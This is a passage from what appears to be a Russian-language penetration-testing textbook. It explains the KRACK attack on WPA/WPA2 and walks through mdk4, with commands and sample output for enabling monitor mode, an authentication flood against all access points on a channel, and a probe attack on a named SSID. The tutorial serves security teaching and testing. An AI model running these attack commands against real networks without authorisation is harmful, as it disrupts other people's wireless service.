   Если передачу значения nonce можно воспроизвести, это означает, что любое создание ключа уязвимо для атаки. Это
   означает не только компрометацию сеансового ключа между станцией и точкой доступа, но и групповой ключ. Это
   обеспечивает многоадресную и широковещательную передачу по беспроводной сети.

   Любая современная беспроводная сеть, независимо от того, использует ли она WPA или WPA2, корпоративную или
   персональную, может быть уязвима для такого рода атак. На момент написания этой статьи существовало не так уж много
   инструментов для автоматизации эксплуатации этой атаки переустановки ключа (KRACK - Key Reinstallation Attack).
   Однако для сетевых элементов доступны некоторые исправления, и, скорее всего, это больше не будет проблемой.

   Использование mdk3/4

   Существует несколько инструментов для беспроводных атак. Одним из них, который можно использовать для нескольких
   типов атак, является mdk3/mdk4. Это инструмент, который можно использовать для выполнения лавинной рассылки
   маяков, атак типа «отказ в обслуживании» и атак деаутентификации, а также других тестов. Это инструмент, который можно
   установить в Kali Linux и ParrotOS. Обе версии доступны в обеих операционных системах. Для начала вам необходимо
   включить режим монитора на беспроводном интерфейсе. Вы можете сделать это с помощью airmon-ng из набора
   инструментов Aircrack . Ниже приведена команда, используемая для включения режима мониторинга на интерфейсе wlan0
   на беспроводном канале 1:

     kilroy@portnoy $ airmon-ng start wlan0 1

   После включения режима мониторинга вы можете приступить к атакам. Мы можем начать атаку аутентификации на все
   доступные SSID на канале, который вы указали при включении режима мониторинга. Ниже приведена команда,
   используемая для запуска атаки аутентификации с использованием интерфейса wlan0mon :

     kilroy@portnoy $ sudo mdk4 wlan0mon a
     Waiting for targets…
     Found new target AP 60:5F:8D:CD:77:A9
     Found new target AP F8:BC:0E:05:BB:89
     Found new target AP F8:BC:0E:05:D1:C9
     Found new target AP 54:83:3A:AF:99:9D
     Found new target AP 88:DA:1A:27:EB:C4
     Found new target AP F8:BB:BF:7A:BF:03
     Connecting Client F6:28:45:5A:18:AB to target AP 60:5F:8D:CD:77:A9 Status: No Response.
     Packets sent: 1 - Speed: 1 packets/sec

   Это атака широким ударом, а это обычно не то, что вы будете делать. Другие атаки будут нацелены на отдельные SSID. Для
   этих атак вам необходимо предоставить некоторую дополнительную информацию. Вы можете использовать атаку методом
   перебора, чтобы определить, был ли скрыт SSID. Он также будет проверять, доступен ли SSID в пределах досягаемости. Ниже
   приведена одна из таких атак на SSID с именем WubbleWiFi :

     kilroy@portnoy $ sudo mdk4 wlan0mon p -e WubbleWiFi
     AP responded on 0 of 1 probes (0 percent)
     Packets sent: 1 - Speed: 1 packets/sec
     AP responded on 0 of 127 probes (0 percent)
     Packets sent: 128 - Speed: 127 packets/sec
